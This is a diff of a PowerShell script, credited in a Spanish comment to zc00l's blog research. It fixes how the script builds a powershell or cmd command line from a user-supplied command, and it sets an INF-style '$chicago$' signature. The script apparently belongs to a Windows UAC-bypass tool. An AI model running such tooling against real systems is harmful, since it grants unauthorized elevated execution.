@@ -50,24 +50,29 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
          }
     }
     
-
-    if ($Executable.ToLower() -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
+    if ($Executable -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
     {
         if ($Command -ne "") {
             $final = "powershell -c ""$Command"""
-    }
+        } else {
+            $final =  "$Executable $Command"
+        }
  
-    } elseif  ($Executable.ToLower() -eq "C:\Windows\system32\cmd.exe") 
+    } elseif  ($Executable -eq "C:\Windows\system32\cmd.exe") 
     {
         if ($Command -ne "") 
         {
             $final = "cmd /c ""$Command"""
+        } else {
+            $final =  "$Executable $Command"
         }
 
-  } else 
-  {
-    $final =  "$Executable $Command"
-  }
+    } else 
+    {
+        
+        $final =  "$Executable $Command"
+    
+    }
 
 $sign = '$chicago$'
 $code = @"
